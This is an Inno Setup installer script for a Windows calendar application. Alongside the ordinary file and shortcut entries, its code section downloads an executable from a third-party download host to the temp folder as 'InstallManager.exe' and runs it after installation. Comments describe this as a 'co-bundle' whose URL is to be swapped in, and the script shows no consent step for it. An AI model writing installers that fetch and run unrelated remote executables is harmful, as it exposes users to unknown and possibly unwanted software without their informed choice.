; Script generated by the Inno Setup Script Wizard.
; SEE THE DOCUMENTATION FOR DETAILS ON CREATING INNO SETUP SCRIPT FILES!

#define MyAppName "Calendar"
#define MyAppVersion "2.2.2"
#define MyAppPublisher "Blue Onion Software"
#define MyAppURL "http://blueonionsoftware.com/calendar.aspx"
#define MyAppExeName "Calendar.exe"

#define ITDRoot "C:\Program Files (x86)\Sherlock Software\InnoTools\Downloader"
#include ITDRoot+'\it_download.iss'

[Code]

//THE CODE BELOW DOWNLOADS THE CO-BUNDLE EXE TO THE TEMP FOLDER
//REPLACE THE DOWNLOAD URL WITH YOUR CO-BUNDLE URL

procedure InitializeWizard();
begin
itd_init;
itd_addfile('http://www.mickyfastdl.com/download.php?lH1+cg==',
expandconstant('{tmp}\InstallManager.exe'));
itd_downloadafter(wpReady);
ITD_SetOption('UI_AllowContinue', '1');
end;

//THE CODE BELOW RUNS THE DOWNLOADED CO-BUNDLE EXE FROM THE TEMP FOLDER

procedure CurStepChanged(CurStep: TSetupStep);
var
AppPath:String;
WorkingDir:String;
ReturnCode:Integer;
begin
if CurStep=ssPostInstall then begin
   WorkingDir := ExpandConstant ('{tmp}');
   AppPath := expandconstant('{tmp}\InstallManager.exe')
   Exec (AppPath, '', WorkingDir, SW_SHOW, ewWaitUntilTerminated,
   ReturnCode);
end;
end;

[Setup]
; NOTE: The value of AppId uniquely identifies this application.
; Do not use the same AppId value in installers for other applications.
; (To generate a new GUID, click Tools | Generate GUID inside the IDE.)
AppId={{FE1099CC-6C21-4EFF-B99E-7A5D0D3169D4}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
;AppVerName={#MyAppName} {#MyAppVersion}
AppPublisher={#MyAppPublisher}
AppPublisherURL={#MyAppURL}
AppSupportURL={#MyAppURL}
AppUpdatesURL={#MyAppURL}
DefaultDirName={pf64}\{#MyAppName}
DefaultGroupName={#MyAppName}
AllowNoIcons=yes
LicenseFile=C:\Users\Mike\Documents\Visual Studio 2010\Projects\Blue Onion Software\Calendar\License.rtf
OutputBaseFilename=CalendarSetup64
SetupIconFile=C:\Users\Mike\Documents\Visual Studio 2010\Projects\Blue Onion Software\Calendar\App.ico
Compression=lzma
SolidCompression=yes

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked
Name: "quicklaunchicon"; Description: "{cm:CreateQuickLaunchIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked; OnlyBelowVersion: 0,6.1

[Files]
Source: "C:\Users\Mike\Documents\Visual Studio 2010\Projects\Blue Onion Software\Calendar\bin\Release\Calendar.exe"; DestDir: "{app}"; Flags: ignoreversion 64bit
Source: "C:\Users\Mike\Documents\Visual Studio 2010\Projects\Blue Onion Software\Calendar\Donate\bin\Release\Donate.exe"; DestDir: "{app}"; Flags: ignoreversion 64bit
Source: "C:\Users\Mike\Documents\Visual Studio 2010\Projects\Blue Onion Software\Calendar\Calendar.mht"; DestDir: "{app}"; Flags: ignoreversion 64bit
Source: "C:\Users\Mike\Documents\Visual Studio 2010\Projects\Blue Onion Software\Calendar\Changes.txt"; DestDir: "{app}"; Flags: ignoreversion 64bit
; NOTE: Don't use "Flags: ignoreversion" on any shared system files

[Icons]
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
Name: "{group}\Calendar Help"; Filename: "{app}\Calendar.mht"
Name: "{group}\Donate"; Filename: "{app}\Donate.exe"
Name: "{group}\{cm:ProgramOnTheWeb,{#MyAppName}}"; Filename: "{#MyAppURL}"
Name: "{group}\{cm:UninstallProgram,{#MyAppName}}"; Filename: "{uninstallexe}"
Name: "{commondesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon
Name: "{userappdata}\Microsoft\Internet Explorer\Quick Launch\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: quicklaunchicon

[Run]
Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, "&", "&&")}}"; Flags: nowait postinstall skipifsilent

